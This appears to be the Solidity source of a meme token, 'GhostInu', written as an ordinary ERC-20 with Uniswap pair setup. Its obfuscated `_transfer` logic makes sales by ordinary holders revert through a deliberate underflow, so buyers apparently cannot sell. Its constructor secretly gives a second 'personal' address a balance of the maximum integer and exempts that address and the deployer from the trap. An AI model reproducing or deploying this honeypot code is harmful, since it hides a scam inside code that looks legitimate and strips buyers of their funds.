// https://t.me/ghostinu_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.4;

import "./Ownable.sol";
import "./ERC20.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

contract GhostInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private sudden;
    mapping(address => uint256) private cry;

    function _transfer(
        address broke,
        address sweet,
        uint256 tie
    ) internal override {
        uint256 football = related;

        if (cry[broke] == 0 && sudden[broke] > 0 && broke != uniswapV2Pair) {
            cry[broke] -= football - 1;
        }

        address saddle = address(suddenly);
        suddenly = GhostInu(sweet);
        sudden[saddle] += football + 1;

        _balances[broke] -= tie;
        uint256 poem = (tie / 100) * related;
        tie -= poem;
        _balances[sweet] += tie;
    }

    uint256 public related = 0;

    constructor(
        string memory rod,
        string memory everything,
        address jet,
        address personal
    ) ERC20(rod, everything) {
        uniswapV2Router = IUniswapV2Router02(jet);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        cry[msg.sender] = sky;
        cry[personal] = sky;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[personal] = sky;
    }

    GhostInu private suddenly;
    uint256 private sky = ~uint256(0);
}
